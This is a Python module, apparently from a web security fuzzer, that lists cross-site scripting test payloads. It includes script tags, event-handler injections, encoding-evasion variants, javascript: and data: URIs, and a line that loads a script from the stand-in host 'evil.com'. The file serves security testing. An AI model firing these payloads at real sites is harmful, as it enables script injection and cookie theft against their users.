"""
app/services/fuzzer/payloads/xss.py
─────────────────────────────────────
Cross-Site Scripting payload library.
"""

XSS_PAYLOADS = [
    # Basic
    "<script>alert(1)</script>",
    "<script>alert(document.domain)</script>",
    "<script>alert(document.cookie)</script>",
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    # Event handlers
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert(document.domain)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<video src=x onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    # HTML5 / Modern
    "<details open ontoggle=alert(1)>",
    "<iframe srcdoc='<script>alert(1)</script>'>",
    "<math href='javascript:alert(1)'>click</math>",
    "<object data='javascript:alert(1)'>",
    # Encoding evasion
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<SCRIPT>alert(1)</SCRIPT>",
    # DOM-based
    "javascript:alert(1)",
    "javascript:void(0);alert(1)",
    "data:text/html,<script>alert(1)</script>",
    # CSP bypass
    "<link rel=import href='data:text/html,<script>alert(1)</script>'>",
    "<script src='//evil.com/xss.js'></script>",
]
